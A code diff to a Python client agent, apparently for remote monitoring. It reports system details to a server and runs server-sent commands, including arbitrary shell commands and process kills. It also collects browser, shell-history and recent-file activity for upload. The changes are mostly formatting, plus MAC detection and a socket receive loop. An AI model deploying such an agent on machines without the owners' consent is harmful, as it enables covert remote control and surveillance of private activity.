@@ -5,6 +5,7 @@ import platform
 import re
 import shutil
 import socket
+import select
 import sqlite3
 import subprocess
 import tempfile
@@ -13,10 +14,10 @@ from datetime import datetime, timedelta
 
 import psutil
 
-
 # ============================================================
 # SYSTEM INFORMATION
 # ============================================================
+
 
 def get_ip():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -30,12 +31,41 @@ def get_ip():
     return ip
 
 
-def get_mac():
+def get_mac(active_ip=None):
+    """Return the MAC for the interface carrying the active IPv4 address.
+
+    ``uuid.getnode()`` can select a virtual, disconnected, or otherwise
+    unrelated adapter on multi-interface machines (especially Windows).  The
+    registration identity must instead be the adapter whose IPv4 address is
+    actually used to reach the server.
+    """
+    active_ip = active_ip or get_ip()
+    link_families = {
+        getattr(psutil, "AF_LINK", None),
+        getattr(socket, "AF_PACKET", None),
+    }
+    link_families.discard(None)
+
+    for addresses in psutil.net_if_addrs().values():
+        has_active_ip = any(
+            address.family == socket.AF_INET and address.address == active_ip
+            for address in addresses
+        )
+        if not has_active_ip:
+            continue
+        for address in addresses:
+            mac_address = address.address.strip().lower()
+            if (
+                address.family in link_families
+                and mac_address
+                and mac_address != "00:00:00:00:00:00"
+            ):
+                return mac_address.replace("-", ":")
+
+    # Keep a best-effort fallback for unusual platforms, but make it visible
+    # to callers that normal interface discovery was not possible.
     mac = uuid.getnode()
-    return ":".join(
-        f"{(mac >> i) & 0xff:02x}"
-        for i in range(40, -1, -8)
-    )
+    return ":".join(f"{(mac >> i) & 0xff:02x}" for i in range(40, -1, -8))
 
 
 def get_hostname():
@@ -44,19 +74,20 @@ def get_hostname():
 
 def get_os():
     return {
-        "system":  platform.system(),
+        "system": platform.system(),
         "release": platform.release(),
         "version": platform.version(),
-        "machine": platform.machine()
+        "machine": platform.machine(),
     }
 
 
-def get_system_info():
+def get_system_info(ip_address=None):
+    ip_address = ip_address or get_ip()
     return {
-        "ip":       get_ip(),
-        "mac":      get_mac(),
+        "ip": ip_address,
+        "mac": get_mac(ip_address),
         "hostname": get_hostname(),
-        "os":       get_os()
+        "os": get_os(),
     }
 
 
@@ -64,23 +95,27 @@ def get_system_info():
 # NETWORK INFORMATION
 # ============================================================
 
+
 def get_network_info():
     interfaces = {}
     for name, addresses in psutil.net_if_addrs().items():
         interfaces[name] = []
         for address in addresses:
-            interfaces[name].append({
-                "family":    str(address.family),
-                "address":   address.address,
-                "netmask":   address.netmask,
-                "broadcast": address.broadcast
-            })
+            interfaces[name].append(
+                {
+                    "family": str(address.family),
+                    "address": address.address,
+                    "netmask": address.netmask,
+                    "broadcast": address.broadcast,
+                }
+            )
     return interfaces
 
 
 # ============================================================
 # CPU INFORMATION
 # ============================================================
+
 
 def get_cpu_brand():
     # 1. Try platform.processor() first
@@ -101,18 +136,22 @@ def get_cpu_brand():
     # 3. macOS fallback (sysctl)
     elif platform.system() == "Darwin":
         try:
-            return subprocess.check_output(
-                ["sysctl", "-n", "machdep.cpu.brand_string"]
-            ).decode().strip()
+            return (
+                subprocess.check_output(["sysctl", "-n", "machdep.cpu.brand_string"])
+                .decode()
+                .strip()
+            )
         except Exception:
             pass
 
     # 4. Windows fallback (wmic)
     elif platform.system() == "Windows":
         try:
-            out = subprocess.check_output(
-                "wmic cpu get name", shell=True
-            ).decode().strip()
+            out = (
+                subprocess.check_output("wmic cpu get name", shell=True)
+                .decode()
+                .strip()
+            )
             lines = [l.strip() for l in out.splitlines() if l.strip()]
             if len(lines) > 1:
                 return lines[1]
@@ -124,17 +163,18 @@ def get_cpu_brand():
 
 def get_cpu_info():
     return {
-        "processor":      get_cpu_brand(),
-        "architecture":   platform.machine(),
+        "processor": get_cpu_brand(),
+        "architecture": platform.machine(),
         "physical_cores": psutil.cpu_count(logical=False),
-        "logical_cores":  psutil.cpu_count(logical=True),
-        "usage_percent":  psutil.cpu_percent(interval=1)
+        "logical_cores": psutil.cpu_count(logical=True),
+        "usage_percent": psutil.cpu_percent(interval=1),
     }
 
 
 # ============================================================
 # MEMORY INFORMATION
 # ============================================================
+
 
 def format_size(bytes_size):
     for unit in ["B", "KB", "MB", "GB", "TB"]:
@@ -147,10 +187,10 @@ def format_size(bytes_size):
 def get_memory_info():
     memory = psutil.virtual_memory()
     return {
-        "total":         format_size(memory.total),
-        "available":     format_size(memory.available),
-        "used":          format_size(memory.used),
-        "usage_percent": f"{memory.percent:.2f}%"
+        "total": format_size(memory.total),
+        "available": format_size(memory.available),
+        "used": format_size(memory.used),
+        "usage_percent": f"{memory.percent:.2f}%",
     }
 
 
@@ -158,19 +198,21 @@ def get_memory_info():
 # DISK INFORMATION
 # ============================================================
 
+
 def get_disk_info():
     disk = psutil.disk_usage("/")
     return {
-        "total":         format_size(disk.total),
-        "used":          format_size(disk.used),
-        "free":          format_size(disk.free),
-        "usage_percent": f"{disk.percent:.2f}%"
+        "total": format_size(disk.total),
+        "used": format_size(disk.used),
+        "free": format_size(disk.free),
+        "usage_percent": f"{disk.percent:.2f}%",
     }
 
 
 # ============================================================
 # PROCESS INFORMATION
 # ============================================================
+
 
 def get_processes():
     processes = []
@@ -197,15 +239,15 @@ def kill_process(process_name):
 
     if killed_count > 0:
         return {
-            "status":  "success",
+            "status": "success",
             "message": f"Terminated {killed_count} process(es) named '{process_name}'",
-            "errors":  errors
+            "errors": errors,
         }
 
     return {
-        "status":  "error",
+        "status": "error",
         "message": f"No active processes found named '{process_name}'",
-        "errors":  errors
+        "errors": errors,
     }
 
 
@@ -213,109 +255,17 @@ def start_process(path):
     try:
         proc = subprocess.Popen(path, shell=True)
         return {
-            "status":  "success",
-            "message": f"Started process '{path}' with PID {proc.pid}"
+            "status": "success",
+            "message": f"Started process '{path}' with PID {proc.pid}",
         }
     except Exception as e:
-        return {
-            "status":  "error",
-            "message": f"Failed to start process: {e!s}"
-        }
-
-
-# ============================================================
-# NETWORK LOG
-# ============================================================
-
-def get_network_log():
-    system = platform.system()
-    logs = []
-
-    if system == "Linux":
-        try:
-            out = subprocess.check_output(
-                ["journalctl", "-u", "NetworkManager", "-n", "30", "--no-pager"],
-                stderr=subprocess.DEVNULL
-            ).decode("utf-8", errors="ignore")
-            logs = [line.strip() for line in out.splitlines() if line.strip()]
-        except Exception:
-            try:
-                for path in ["/var/log/syslog", "/var/log/messages"]:
-                    if os.path.exists(path):
-                        with open(path, "r") as f:
-                            lines = f.readlines()[-150:]
-                        for line in lines:
-                            if any(k in line.lower() for k in ["dhcp", "networkmanager", "wlan", "eth0", "wlp"]):
-                                logs.append(line.strip())
-                        break
-            except Exception as e:
-                logs = [f"Error reading Linux network logs: {e}"]
-
-    elif system == "Windows":
-        try:
-            cmd = "wevtutil qe Microsoft-Windows-Dhcp-Client/Operational /c:30 /f:text /rd:true"
-            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode("utf-8", errors="ignore")
-            logs = [line.strip() for line in out.splitlines() if line.strip()]
-        except Exception as e:
-            logs = [f"Error reading Windows event logs: {e}"]
-
-    elif system == "Darwin":
-        try:
-            out = subprocess.check_output(
-                ["log", "show", "--predicate", 'process == "configd"', "--last", "1h", "--style", "syslog"],
-                stderr=subprocess.DEVNULL
-            ).decode("utf-8", errors="ignore")
-            logs = [line.strip() for line in out.splitlines() if line.strip()][-30:]
-        except Exception as e:
-            logs = [f"Error reading macOS network logs: {e}"]
-
-    if not logs:
-        return {"logs": ["No network connection events found in system logs."]}
-
-    # Parse raw logs into a readable timeline
-    parsed_logs = []
-    for line in logs:
-        ts_match = re.match(r"^([A-Z][a-z]{2}\s+\d+\s+\d+:\d+:\d+)", line)
-        timestamp = ts_match.group(1) if ts_match else "Recent"
-
-        if "state change:" in line:
-            m = re.search(r"state change:\s*(\w+)\s*->\s*(\w+)", line)
-            if m:
-                parsed_logs.append(f"{timestamp} - Interface State Change: {m.group(1)} -> {m.group(2)}")
-                continue
-
-        if "Connected to wireless network" in line:
-            m = re.search(r'Connected to wireless network\s+"([^"]+)"', line)
-            ssid = m.group(1) if m else "Wi-Fi"
-            parsed_logs.append(f'{timestamp} - Connected to Wi-Fi: "{ssid}"')
-            continue
-
-        if "new lease, address=" in line:
-            m = re.search(r"address=([\d\.]+)", line)
-            ip_addr = m.group(1) if m else "IP Address"
-            parsed_logs.append(f"{timestamp} - Obtained DHCP Lease IP: {ip_addr}")
-            continue
-
-        if "NetworkManager state is now" in line:
-            m = re.search(r"state is now\s+(\w+)", line)
-            if m:
-                parsed_logs.append(f"{timestamp} - Network State: {m.group(1)}")
-                continue
-
-        if "deactivated" in line or "disconnected" in line:
-            parsed_logs.append(f"{timestamp} - Interface disconnected or deactivated")
-            continue
-
-        if "DHCP" in line or "IP address" in line or "lease" in line:
-            parsed_logs.append(f"{timestamp} - {re.sub(r'\\s+', ' ', line).strip()}")
-            continue
-
-    return {"logs": parsed_logs if parsed_logs else logs}
+        return {"status": "error", "message": f"Failed to start process: {e!s}"}
 
 
 # ============================================================
 # ACTIVITY LOG
 # ============================================================
+
 
 def _read_chrome_history(db_path, browser_name, add, cutoff_epoch):
     if not os.path.exists(db_path):
@@ -332,13 +282,13 @@ def _read_chrome_history(db_path, browser_name, add, cutoff_epoch):
             "SELECT title, url, "
             "datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') as visit_time "
             "FROM urls WHERE last_visit_time >= ? ORDER BY last_visit_time DESC LIMIT 200",
-            (chrome_epoch,)
+            (chrome_epoch,),
         )
         for row in cur.fetchall():
             add(
                 row["visit_time"] or "Unknown",
                 f"Browser ({browser_name})",
-                f"{row['title'] or '(no title)'} — {row['url']}"
+                f"{row['title'] or '(no title)'} — {row['url']}",
             )
         conn.close()
     except Exception:
@@ -348,6 +298,8 @@ def _read_chrome_history(db_path, browser_name, add, cutoff_epoch):
             os.remove(tmp)
         except Exception:
             pass
+
+
 def _read_firefox_history(db_path, add, cutoff_epoch):
     """
     Read Firefox browsing history from places.sqlite.
@@ -383,7 +335,7 @@ def _read_firefox_history(db_path, add, cutoff_epoch):
             ORDER BY h.visit_date DESC
             LIMIT 500
             """,
-            (ff_cutoff,)
+            (ff_cutoff,),
         )
 
         rows = cur.fetchall()
@@ -399,7 +351,7 @@ def _read_firefox_history(db_path, add, cutoff_epoch):
             add(
                 visit_time,
                 "Browser (Firefox)",
-                f"{row['title'] or '(no title)'} — {row['url']}"
+                f"{row['title'] or '(no title)'} — {row['url']}",
             )
 
         conn.close()
@@ -515,11 +467,7 @@ def _read_shell_history(path, add, cutoff_epoch):
                     "%Y-%m-%d %H:%M:%S"
                 )
 
-                add(
-                    ts,
-                    "Shell Command",
-                    command
-                )
+                add(ts, "Shell Command", command)
 
         current_command = []
 
@@ -551,6 +499,7 @@ def _read_shell_history(path, add, cutoff_epoch):
     # Flush the final command.
     flush_command()
 
+
 def _find_firefox_profiles(home):
     """
     Find Firefox places.sqlite databases across common Linux
@@ -559,31 +508,11 @@ def _find_firefox_profiles(home):
 
     profile_roots = [
         # Native Firefox
-        os.path.join(
-            home,
-            ".mozilla",
-            "firefox"
-        ),
-
+        os.path.join(home, ".mozilla", "firefox"),
         # Firefox Snap
-        os.path.join(
-            home,
-            "snap",
-            "firefox",
-            "common",
-            ".mozilla",
-            "firefox"
-        ),
-
+        os.path.join(home, "snap", "firefox", "common", ".mozilla", "firefox"),
         # Firefox Flatpak
-        os.path.join(
-            home,
-            ".var",
-            "app",
-            "org.mozilla.firefox",
-            ".mozilla",
-            "firefox"
-        ),
+        os.path.join(home, ".var", "app", "org.mozilla.firefox", ".mozilla", "firefox"),
     ]
 
     profiles = []
@@ -593,18 +522,11 @@ def _find_firefox_profiles(home):
         if not os.path.isdir(root):
             continue
 
-        profiles.extend(
-            glob.glob(
-                os.path.join(
-                    root,
-                    "*",
-                    "places.sqlite"
-                )
-            )
-        )
+        profiles.extend(glob.glob(os.path.join(root, "*", "places.sqlite")))
 
     # Remove duplicates while preserving order
     return list(dict.fromkeys(profiles))
+
 
 def get_activity_log(period="1d"):
     """
@@ -647,10 +569,7 @@ def get_activity_log(period="1d"):
         if time_str not in ("Unknown", "Recent"):
 
             try:
-                activity_time = datetime.strptime(
-                    time_str,
-                    "%Y-%m-%d %H:%M:%S"
-                )
+                activity_time = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
 
                 if activity_time < cutoff:
                     return
@@ -658,11 +577,13 @@ def get_activity_log(period="1d"):
             except (ValueError, TypeError):
                 time_str = "Unknown"
 
-        activity.append({
-            "time": time_str,
-            "type": entry_type,
-            "detail": detail,
-        })
+        activity.append(
+            {
+                "time": time_str,
+                "type": entry_type,
+                "detail": detail,
+            }
+        )
 
     # ============================================================
     # LINUX
@@ -675,34 +596,14 @@ def get_activity_log(period="1d"):
         # --------------------------------------------------------
 
         browser_roots = {
-            "Chrome": os.path.join(
-                home,
-                ".config/google-chrome"
-            ),
-
-            "Chromium": os.path.join(
-                home,
-                ".config/chromium"
-            ),
-
-            "Brave": os.path.join(
-                home,
-                ".config/BraveSoftware/Brave-Browser"
-            ),
-
-            "Edge": os.path.join(
-                home,
-                ".config/microsoft-edge"
-            ),
+            "Chrome": os.path.join(home, ".config/google-chrome"),
+            "Chromium": os.path.join(home, ".config/chromium"),
+            "Brave": os.path.join(home, ".config/BraveSoftware/Brave-Browser"),
+            "Edge": os.path.join(home, ".config/microsoft-edge"),
         }
 
         for name, profile_root in browser_roots.items():
-            _read_chromium_profiles(
-                profile_root,
-                name,
-                add,
-                cutoff_epoch
-            )
+            _read_chromium_profiles(profile_root, name, add, cutoff_epoch)
 
         # --------------------------------------------------------
         # Firefox history
@@ -711,55 +612,30 @@ def get_activity_log(period="1d"):
         ff_profiles = _find_firefox_profiles(home)
 
         for firefox_db in ff_profiles:
-            _read_firefox_history(
-                firefox_db,
-                add,
-                cutoff_epoch
-            )
+            _read_firefox_history(firefox_db, add, cutoff_epoch)
 
         # --------------------------------------------------------
         # Recently opened files
         # --------------------------------------------------------
 
-        recent_xbel = os.path.join(
-            home,
-            ".local/share/recently-used.xbel"
-        )
+        recent_xbel = os.path.join(home, ".local/share/recently-used.xbel")
 
         if os.path.exists(recent_xbel):
 
             try:
-                with open(
-                    recent_xbel,
-                    "r",
-                    encoding="utf-8",
-                    errors="ignore"
-                ) as f:
+                with open(recent_xbel, "r", encoding="utf-8", errors="ignore") as f:
 
                     content = f.read()
 
                 for match in re.finditer(
-                    r'<bookmark href="([^"]+)"[^>]*modified="([^"]+)"',
-                    content
+                    r'<bookmark href="([^"]+)"[^>]*modified="([^"]+)"', content
                 ):
 
-                    path = (
-                        match.group(1)
-                        .replace("file://", "")
-                        .replace("%20", " ")
-                    )
+                    path = match.group(1).replace("file://", "").replace("%20", " ")
 
-                    ts = (
-                        match.group(2)
-                        .replace("T", " ")
-                        .split(".")[0]
-                    )
+                    ts = match.group(2).replace("T", " ").split(".")[0]
 
-                    add(
-                        ts,
-                        "Opened File",
-                        path
-                    )
+                    add(ts, "Opened File", path)
 
             except Exception:
                 pass
@@ -768,31 +644,17 @@ def get_activity_log(period="1d"):
         # Shell history
         # --------------------------------------------------------
 
-        bash_history = os.path.join(
-            home,
-            ".bash_history"
-        )
+        bash_history = os.path.join(home, ".bash_history")
 
-        zsh_history = os.path.join(
-            home,
-            ".zsh_history"
-        )
+        zsh_history = os.path.join(home, ".zsh_history")
 
         if os.path.exists(bash_history):
 
-            _read_shell_history(
-                bash_history,
-                add,
-                cutoff_epoch
-            )
+            _read_shell_history(bash_history, add, cutoff_epoch)
 
         if os.path.exists(zsh_history):
 
-            _read_shell_history(
-                zsh_history,
-                add,
-                cutoff_epoch
-            )
+            _read_shell_history(zsh_history, add, cutoff_epoch)
 
     # ============================================================
     # WINDOWS
@@ -800,72 +662,39 @@ def get_activity_log(period="1d"):
 
     elif system == "Windows":
 
-        app_data = os.environ.get(
-            "LOCALAPPDATA",
-            ""
-        )
+        app_data = os.environ.get("LOCALAPPDATA", "")
 
-        roaming = os.environ.get(
-            "APPDATA",
-            ""
-        )
+        roaming = os.environ.get("APPDATA", "")
 
         # --------------------------------------------------------
         # Browser history
         # --------------------------------------------------------
 
         browser_roots = {
-            "Chrome": os.path.join(
-                app_data,
-                r"Google\Chrome\User Data"
-            ),
-
-            "Edge": os.path.join(
-                app_data,
-                r"Microsoft\Edge\User Data"
-            ),
-
-            "Brave": os.path.join(
-                app_data,
-                r"BraveSoftware\Brave-Browser\User Data"
-            ),
+            "Chrome": os.path.join(app_data, r"Google\Chrome\User Data"),
+            "Edge": os.path.join(app_data, r"Microsoft\Edge\User Data"),
+            "Brave": os.path.join(app_data, r"BraveSoftware\Brave-Browser\User Data"),
         }
 
         for name, profile_root in browser_roots.items():
 
-            _read_chromium_profiles(
-                profile_root,
-                name,
-                add,
-                cutoff_epoch
-            )
+            _read_chromium_profiles(profile_root, name, add, cutoff_epoch)
 
         # --------------------------------------------------------
         # Firefox
         # --------------------------------------------------------
 
-        ff_base = os.path.join(
-            roaming,
-            r"Mozilla\Firefox\Profiles"
-        )
+        ff_base = os.path.join(roaming, r"Mozilla\Firefox\Profiles")
 
         if os.path.isdir(ff_base):
 
             for profile in os.listdir(ff_base):
 
-                places = os.path.join(
-                    ff_base,
-                    profile,
-                    "places.sqlite"
-                )
+                places = os.path.join(ff_base, profile, "places.sqlite")
 
                 if os.path.exists(places):
 
-                    _read_firefox_history(
-                        places,
-                        add,
-                        cutoff_epoch
-                    )
+                    _read_firefox_history(places, add, cutoff_epoch)
 
                     break
 
@@ -873,22 +702,13 @@ def get_activity_log(period="1d"):
         # Recently opened files
         # --------------------------------------------------------
 
-        recent_dir = os.path.join(
-            roaming,
-            r"Microsoft\Windows\Recent"
-        )
+        recent_dir = os.path.join(roaming, r"Microsoft\Windows\Recent")
 
         if os.path.isdir(recent_dir):
 
-            for lnk in sorted(
-                os.listdir(recent_dir),
-                reverse=True
-            ):
+            for lnk in sorted(os.listdir(recent_dir), reverse=True):
 
-                full = os.path.join(
-                    recent_dir,
-                    lnk
-                )
+                full = os.path.join(recent_dir, lnk)
 
                 try:
                     mtime = os.path.getmtime(full)
@@ -897,17 +717,9 @@ def get_activity_log(period="1d"):
 
                 if mtime >= cutoff_epoch:
 
-                    ts = datetime.fromtimestamp(
-                        mtime
-                    ).strftime(
-                        "%Y-%m-%d %H:%M:%S"
-                    )
+                    ts = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
 
-                    add(
-                        ts,
-                        "Opened File",
-                        lnk.replace(".lnk", "")
-                    )
+                    add(ts, "Opened File", lnk.replace(".lnk", ""))
 
     # ============================================================
     # MACOS
@@ -920,30 +732,16 @@ def get_activity_log(period="1d"):
         # --------------------------------------------------------
 
         browser_roots = {
-            "Chrome": os.path.join(
-                home,
-                "Library/Application Support/Google/Chrome"
-            ),
-
-            "Edge": os.path.join(
-                home,
-                "Library/Application Support/Microsoft Edge"
-            ),
-
+            "Chrome": os.path.join(home, "Library/Application Support/Google/Chrome"),
+            "Edge": os.path.join(home, "Library/Application Support/Microsoft Edge"),
             "Brave": os.path.join(
-                home,
-                "Library/Application Support/BraveSoftware/Brave-Browser"
+                home, "Library/Application Support/BraveSoftware/Brave-Browser"
             ),
         }
 
         for name, profile_root in browser_roots.items():
 
-            _read_chromium_profiles(
-                profile_root,
-                name,
-                add,
-                cutoff_epoch
-            )
+            _read_chromium_profiles(profile_root, name, add, cutoff_epoch)
 
         # --------------------------------------------------------
         # Firefox
@@ -952,17 +750,13 @@ def get_activity_log(period="1d"):
         ff_profiles = glob.glob(
             os.path.join(
                 home,
-                "Library/Application Support/Firefox/Profiles/*.default*/places.sqlite"
+                "Library/Application Support/Firefox/Profiles/*.default*/places.sqlite",
             )
         )
 
         if ff_profiles:
 
-            _read_firefox_history(
-                ff_profiles[0],
-                add,
-                cutoff_epoch
-            )
+            _read_firefox_history(ff_profiles[0], add, cutoff_epoch)
 
         _read_safari_history(
             os.path.join(home, "Library", "Safari", "History.db"),
@@ -989,18 +783,11 @@ def get_activity_log(period="1d"):
                 ],
                 timeout=5,
                 stderr=subprocess.DEVNULL,
-            ).decode(
-                "utf-8",
-                errors="ignore"
-            )
+            ).decode("utf-8", errors="ignore")
 
             for line in out.splitlines()[:50]:
 
-                add(
-                    "Recent",
-                    "Opened File",
-                    line.strip()
-                )
+                add("Recent", "Opened File", line.strip())
 
         except Exception:
             pass
@@ -1010,11 +797,7 @@ def get_activity_log(period="1d"):
     # ============================================================
 
     activity.sort(
-        key=lambda e: (
-            0 if e["time"] == "Unknown" else 1,
-            e["time"]
-        ),
-        reverse=True
+        key=lambda e: (0 if e["time"] == "Unknown" else 1, e["time"]), reverse=True
     )
 
     # ============================================================
@@ -1024,9 +807,7 @@ def get_activity_log(period="1d"):
     return {
         "period": period,
         "since": cutoff_str,
-        "generated_at": datetime.now().strftime(
-            "%Y-%m-%d %H:%M:%S"
-        ),
+        "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "activity": activity,
     }
 
@@ -1034,6 +815,7 @@ def get_activity_log(period="1d"):
 # ============================================================
 # COMMAND HANDLER (dispatcher)
 # ============================================================
+
 
 def handle_command(message):
     if not isinstance(message, dict):
@@ -1071,9 +853,6 @@ def handle_command(message):
             return {"error": "Process path parameter missing"}
         return start_process(path)
 
-    elif command == "GET_NETWORK_LOG":
-        return get_network_log()
-
     elif command == "GET_ACTIVITY_LOG":
         period = message.get("args", "1d")
         return get_activity_log(period)
@@ -1091,16 +870,15 @@ def handle_command(message):
 # REGISTRATION MESSAGE
 # ============================================================
 
-def create_registration_message():
-    return {
-        "type": "REGISTER",
-        "data": get_system_info()
-    }
+
+def create_registration_message(ip_address=None):
+    return {"type": "REGISTER", "data": get_system_info(ip_address)}
 
 
 # ============================================================
 # SEND / RECEIVE
 # ============================================================
+
 
 def send_message(connection, message):
     data = json.dumps(message).encode()
@@ -1108,10 +886,23 @@ def send_message(connection, message):
     connection.sendall(len(data).to_bytes(4, byteorder="big") + data)
 
 
-def receive_message(connection):
-    # Read the 4-byte length header first
+def receive_message(connection, stop_event=None, poll_interval=0.5):
+    def wait_for_readable():
+        while True:
+            if stop_event and stop_event.is_set():
+                return False
+            try:
+                readable, _, _ = select.select([connection], [], [], poll_interval)
+            except (OSError, ValueError):
+                return False
+            if readable:
+                return True
+
+    # Read the 4-byte length header first.
     header = b""
     while len(header) < 4:
+        if not wait_for_readable():
+            return None
         chunk = connection.recv(4 - len(header))
         if not chunk:
             return None
@@ -1119,9 +910,11 @@ def receive_message(connection):
 
     total = int.from_bytes(header, byteorder="big")
 
-    # Read exactly `total` bytes
+    # Read exactly `total` bytes.
     data = b""
     while len(data) < total:
+        if not wait_for_readable():
+            return None
         chunk = connection.recv(min(65536, total - len(data)))
         if not chunk:
             return None
